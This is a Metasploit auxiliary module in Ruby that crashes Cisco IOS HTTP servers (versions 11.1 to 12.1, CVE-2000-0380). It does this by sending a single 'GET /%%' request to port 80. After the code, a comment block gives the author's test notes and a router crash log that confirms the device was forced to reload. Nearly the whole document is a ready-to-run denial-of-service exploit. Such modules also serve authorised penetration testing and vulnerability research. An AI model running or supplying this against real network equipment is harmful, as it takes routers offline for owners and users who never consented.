##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco IOS HTTP GET /%% Request Denial of Service',
      'Description'    => %q{
        This module triggers a Denial of Service condition in the Cisco IOS
        HTTP server. By sending a GET request for "/%%", the device becomes
        unresponsive. IOS 11.1 -> 12.1 are reportedly vulnerable. This module
        tested successfully against a Cisco 1600 Router IOS v11.2(18)P.
      },
      'Author' 		=> [ 'Patrick Webster <patrick[at]aushack.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'BID', '1154'],
          [ 'CVE', '2000-0380'],
          [ 'URL', 'http://www.cisco.com/warp/public/707/cisco-sa-20000514-ios-http-server.shtml'],
          [ 'OSVDB', '1302' ],
        ],
      'DisclosureDate' => 'Apr 26 2000'))

    register_options(
      [
        Opt::RPORT(80),
      ], self.class)

  end

  def run
    connect

    print_status("Sending HTTP DoS packet")

    sploit = "GET /%% HTTP/1.0"
    sock.put(sploit + "\r\n")

    disconnect
  end

end

=begin

Patrick Webster 20070915 Cisco 1600 Router IOS v11.2(18)P

IOS info:
  IOS (tm) 1600 Software (C1600-Y-L), Version 11.2(18)P,  RELEASE SOFTWARE (fc1)
  Copyright (c) 1986-1999 by cisco Systems, Inc.
  Compiled Mon 12-Apr-99 14:53 by ashah

Example crash:

  %Software-forced reload
  Preparing to dump core...
  Router>
  *Mar  1 00:03:06.349: %SYS-2-WATCHDOG: Process aborted on watchdog timeout, Process = HTTP Server
  -Traceback= 80EE1BC 80F0EC0 80EC004 81C0832 81C0B2E 81C0C76 81C0D68 81C0E4E
  Queued messages:
  *** EXCEPTION ***
  software forced crash
  program counter = 0x80eaca6
  status register = 0x2700
  vbr at time of exception = 0x4000000

=end
